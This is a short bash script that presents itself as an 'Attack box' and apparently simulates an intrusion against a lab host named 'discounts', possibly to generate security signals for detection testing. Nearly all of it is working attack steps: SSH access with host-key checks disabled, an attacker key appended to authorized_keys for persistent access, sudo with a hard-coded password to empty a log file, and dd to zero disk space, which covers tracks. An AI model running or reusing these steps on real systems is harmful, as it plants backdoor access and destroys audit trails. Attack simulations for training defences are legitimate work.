#!/bin/bash
echo "Starting Attack box..." && sleep 2

# cat /home/test/.ssh/storedog-leaked-key.pub >> /home/test/.ssh/authorized_keys
# ssh-copy-id -i /home/test/.ssh/storedog-leaked-key.pub test@discounts

echo "attempt entering discounts..."

ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
touch i-attacked-u.txt
exit
EOT

echo "attempt to copy attacker key to discounts...."
scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh

echo "attempt to update authorized_keys to have attacker key..."
ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
cat /home/test/.ssh/attacker-key.pub >> /home/test/.ssh/authorized_keys
exit
EOT

echo "attempt entering discounts with attacker key..."
ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
touch now-i-can-access-with-my-key-2.txt
exit
EOT

# TODO - The log file should be switched to /var/log/secure
echo "attempt to clear log file and zero out unallocated disk space"
ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
echo "test" | sudo -S cat /dev/null > /var/log/alternatives.log
echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
exit
EOT

if  [ "${DIRBUSTER}" = true ];
then
echo "I invoked DIRBUSTER"
fi

if  [ "${BRUTEFORCE}" = true ];
then
echo "I invoked BRUTEFORCE"
fi


echo "done!" && sleep 3500